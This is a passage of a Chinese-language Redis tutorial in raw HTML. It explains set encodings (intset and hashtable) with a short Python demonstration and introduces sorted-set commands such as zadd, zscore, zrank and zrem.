…]</td>\n<td>O(k),k是元素的个数</td>\n</tr>\n<tr>\n<td>scard key</td>\n<td>O(1)</td>\n</tr>\n<tr>\n<td>sismember key member</td>\n<td>O(1)</td>\n</tr>\n<tr>\n<td>srandmember key [count]</td>\n<td>O(count)</td>\n</tr>\n<tr>\n<td>spop key [count]</td>\n<td>O(1)</td>\n</tr>\n<tr>\n<td>smembers key</td>\n<td>O(n),n是元素的总数</td>\n</tr>\n<tr>\n<td>sinter key [key …]</td>\n<td>O(m * k)，k是多个集合中元素最少的个数，m是键个数</td>\n</tr>\n<tr>\n<td>sunion key [key …]</td>\n<td>O(k)，k是多个元素个数和</td>\n</tr>\n<tr>\n<td>sdiff key [key …]</td>\n<td>O(k)，k是多个元素个数和</td>\n</tr>\n<tr>\n<td>sinterstore destination key [key …]</td>\n<td>O(m * k)，k是多个集合中元素最少的个数，m是键个数</td>\n</tr>\n<tr>\n<td>sunionstore destination key [key …]</td>\n<td>O(k)，k是多个元素个数和</td>\n</tr>\n<tr>\n<td>sdiffstore destination key [key …]</td>\n<td>O(k)，k是多个元素个数和</td>\n</tr>\n</tbody>\n</table>\n<p> </p>\n<h2>内部编码</h2>\n<ul>\n<li>intset(整数集合)：当集合中的元素都是整数，并且集合中的元素个数小于 512 个时，Redis 会选用 intset 作为底层内部实现。</li>\n<li>hashtable(哈希表)：当上述条件不满足时，Redis 会采用 hashtable 作为底层实现。</li>\n</ul>\n<p>备注：我们可以通过 set-max-intset-entries 参数来设置上述中的默认参数。</p>\n<p>下面我们看一下具体的事例，来验证我们上面提到的内部编码。</p>\n<p>当元素个数较少并且都是整数时，内部编码为 intset。</p>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/09/032ce38a47d910e17c63f34f0315de26.png\" width=\"395\" height=\"108\"></p>\n<p>当元素不全是整数时，内部编码为 hashtable。</p>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/09/3b7537ab62a1d9e09b45374a6038e320.png\" width=\"446\" height=\"383\"></p>\n<p>当元素个数超过 512 个时，内部编码为 hashtable。</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab6ad0892c1982174695\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nimport redis\r\n\r\nr = redis.Redis(host='127.0.0.1', port=6379)\r\n    if r.object('encoding', 'setkey') != None:    \r\n    print('Key为【setkey】的字节编码为【%s】' % r.object('encoding', 'setkey').decode('utf-8'))\r\nfor i in range(1, 600):\r\n    r.sadd('setkey', i)\r\nif r.object('encoding', 'setkey') != None:\r\n    print('Key为【setkey】的字节编码为【%s】' % r.object('encoding', 'setkey').decode('utf-8'))\r\nKey为【setkey】的字节编码为【intset】\r\nKey为【setkey】的字节编码为【hashtable】</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab6ad0892c1982174695-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab6ad0892c1982174695-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5bab6ad0892c1982174695-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab6ad0892c1982174695-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5bab6ad0892c1982174695-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab6ad0892c1982174695-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5bab6ad0892c1982174695-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab6ad0892c1982174695-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-5bab6ad0892c1982174695-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab6ad0892c1982174695-10\">10</div><div class=\"crayon-num\" data-line=\"crayon-5bab6ad0892c1982174695-11\">11</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab6ad0892c1982174695-1\"><span class=\"crayon-e\">import </span><span class=\"crayon-i\">redis</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab6ad0892c1982174695-2\"> </div><div class=\"crayon-line\" id=\"crayon-5bab6ad0892c1982174695-3\"><span class=\"crayon-v\">r</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">redis</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">Redis</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">host</span><span class=\"crayon-o\">=</span><span class=\"crayon-s\">'127.0.0.1'</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">port</span><span class=\"crayon-o\">=</span><span class=\"crayon-cn\">6379</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab6ad0892c1982174695-4\">    <span class=\"crayon-st\">if</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">r</span><span class=\"crayon-sy\">.</span><span class=\"crayon-t\">object</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">'encoding'</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">'setkey'</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">!=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">None</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\">    </span></div><div class=\"crayon-line\" id=\"crayon-5bab6ad0892c1982174695-5\">    <span class=\"crayon-e\">print</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">'Key为【setkey】的字节编码为【%s】'</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">%</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">r</span><span class=\"crayon-sy\">.</span><span class=\"crayon-t\">object</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">'encoding'</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">'setkey'</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">decode</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">'utf-8'</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab6ad0892c1982174695-6\"><span class=\"crayon-st\">for</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">i</span><span class=\"crayon-h\"> </span><span class=\"crayon-st\">in</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">range</span><span class=\"crayon-sy\">(</span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">600</span><span class=\"crayon-sy\">)</span><span class=\"crayon-o\">:</span></div><div class=\"crayon-line\" id=\"crayon-5bab6ad0892c1982174695-7\"><span class=\"crayon-h\">    </span><span class=\"crayon-v\">r</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">sadd</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">'setkey'</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">i</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab6ad0892c1982174695-8\"><span class=\"crayon-st\">if</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">r</span><span class=\"crayon-sy\">.</span><span class=\"crayon-t\">object</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">'encoding'</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">'setkey'</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">!=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">None</span><span class=\"crayon-o\">:</span></div><div class=\"crayon-line\" id=\"crayon-5bab6ad0892c1982174695-9\"><span class=\"crayon-h\">    </span><span class=\"crayon-e\">print</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">'Key为【setkey】的字节编码为【%s】'</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">%</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">r</span><span class=\"crayon-sy\">.</span><span class=\"crayon-t\">object</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">'encoding'</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">'setkey'</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">decode</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">'utf-8'</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab6ad0892c1982174695-10\"><span class=\"crayon-i\">Key</span>为【<span class=\"crayon-i\">setkey</span>】的字节编码为【<span class=\"crayon-i\">intset</span>】</div><div class=\"crayon-line\" id=\"crayon-5bab6ad0892c1982174695-11\"><span class=\"crayon-i\">Key</span>为【<span class=\"crayon-i\">setkey</span>】的字节编码为【<span class=\"crayon-i\">hashtable</span>】</div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0029 seconds] -->\r\n<p> </p>\n<h1>有序集合类型</h1>\n<p>看名字我们就知道，有序集合也是一种集合，并且这个集合还是有序的。列表也是有序的，那它和有序集合又有什么不同呢？有序集合的有序和列表的有序是不同的。列表中的有序指的的是插入元素的顺序和查询元素的顺序相同，而有序集合中的有序指的是它会为每个元素设置一个分数(score)，而查询时可以通过分数计算元素的排名，然后再返回结果。因为有序集合也是集合类型，所以有序集合中也是不插入重复元素的，但在有序集合中分数则是可以重复，那如果在有序集合中有多个元素的分数是相同的，这些重复元素的排名是怎么计算的呢？后边我们再做详细说明。</p>\n<p>下面先看一下列表、集合、有序集合三种数据类型之间的区别：</p>\n<table cellspacing=\"0\" cellpadding=\"0\">\n<tbody>\n<tr>\n<td>数据结构</td>\n<td>是否允许重复元素</td>\n<td>是否有序</td>\n<td>有序实现方式</td>\n<td>应用场景</td>\n</tr>\n<tr>\n<td>列表</td>\n<td>是</td>\n<td>是</td>\n<td>索引下标</td>\n<td>时间轴、消息队列</td>\n</tr>\n<tr>\n<td>集合</td>\n<td>否</td>\n<td>否</td>\n<td>无</td>\n<td>标签、社交</td>\n</tr>\n<tr>\n<td>有序集合</td>\n<td>否</td>\n<td>是</td>\n<td>分数</td>\n<td>排行榜、社交</td>\n</tr>\n</tbody>\n</table>\n<p> </p>\n<h2>命令</h2>\n<p> </p>\n<h3>1.集合内操作</h3>\n<ul>\n<li>添加元素</li>\n</ul>\n<p></p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab6ad0892c6825394434\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nzadd key [NX|XX] [CH] [INCR] score member [score member ...]</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab6ad0892c6825394434-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab6ad0892c6825394434-1\"><span class=\"crayon-e\">zadd </span><span class=\"crayon-i\">key</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">NX</span><span class=\"crayon-o\">|</span><span class=\"crayon-v\">XX</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">CH</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">INCR</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">score </span><span class=\"crayon-i\">member</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-e\">score </span><span class=\"crayon-i\">member</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">]</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0008 seconds] -->\r\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/09/60ccc27eea0596ddc23b30551095d1d8.png\" width=\"523\" height=\"71\"></p>\n<p>zadd 命令也是有返回值的，返回值就是当前 zadd 命令成功添加元素的个数。zadd 命令有很多选填参数：</p>\n<ul>\n<li>nx: 元素必须不存在时，才可以设置成功。</li>\n<li>xx: 元素必须存在时，才可以设置成功。</li>\n<li>ch: 返回此命令执行完成后，有序集合元素和分数发生变化的个数</li>\n<li>incr: 对 score 做增加。</li>\n</ul>\n<p>备注：由于有序集合相比集合提供了排序字段，正是因为如此也付出了相应的代价，sadd 的时间复杂度为 O(1)，而 zadd 的时间复杂度为O(log(n))。</p>\n<ul>\n<li>计算成员个数</li>\n</ul>\n<p></p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab6ad0892cc429856561\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nzcard key</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab6ad0892cc429856561-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab6ad0892cc429856561-1\"><span class=\"crayon-e\">zcard </span><span class=\"crayon-v\">key</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0003 seconds] -->\r\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/09/2e6cc22628e34c27dd3de164ec804786.png\" width=\"343\" height=\"67\"></p>\n<ul>\n<li>计算某个成员的分数</li>\n</ul>\n<p></p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab6ad0892d0702392448\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nzscore key member</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab6ad0892d0702392448-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab6ad0892d0702392448-1\"><span class=\"crayon-e\">zscore </span><span class=\"crayon-e\">key </span><span class=\"crayon-v\">member</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0003 seconds] -->\r\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/09/1423752d151499452622621ba252db47.png\" width=\"363\" height=\"154\"></p>\n<p>在使用 zscore 命令时，如果 key 不存在，或者元素不存在时，该命令返回的都是(nil)。</p>\n<ul>\n<li>计算成员的排名</li>\n</ul>\n<p></p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab6ad0892d3013602232\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nzrank key member\r\nzrevrank key member</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab6ad0892d3013602232-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab6ad0892d3013602232-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab6ad0892d3013602232-1\"><span class=\"crayon-e\">zrank </span><span class=\"crayon-e\">key </span><span class=\"crayon-e\">member</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab6ad0892d3013602232-2\"><span class=\"crayon-e\">zrevrank </span><span class=\"crayon-e\">key </span><span class=\"crayon-v\">member</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0004 seconds] -->\r\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/09/80764823270bb47ffd23fb316c457408.png\" width=\"374\" height=\"113\"></p>\n<p>zrank 命令是从分数低到高排名，而 zrevrank 命令则恰恰相反，从高到低排名。有一点要特别注意， zrank 和 zrevrank 命令与 zscore 是命令不同的，前者通过分数计算出最后的排名，而后者则是直接返回当前元素的分数。</p>\n<ul>\n<li>删除元素</li>\n</ul>\n<p></p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab6ad0892d6789542534\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nzrem key member [member ...]</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab6ad0892d6789542534-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab6ad0892d6789542534-1\"><span class=\"crayon-e\">zrem </span><span class=\"crayon-e\">key </span><span class=\"crayon-i\">member</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-i\">member</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span><span 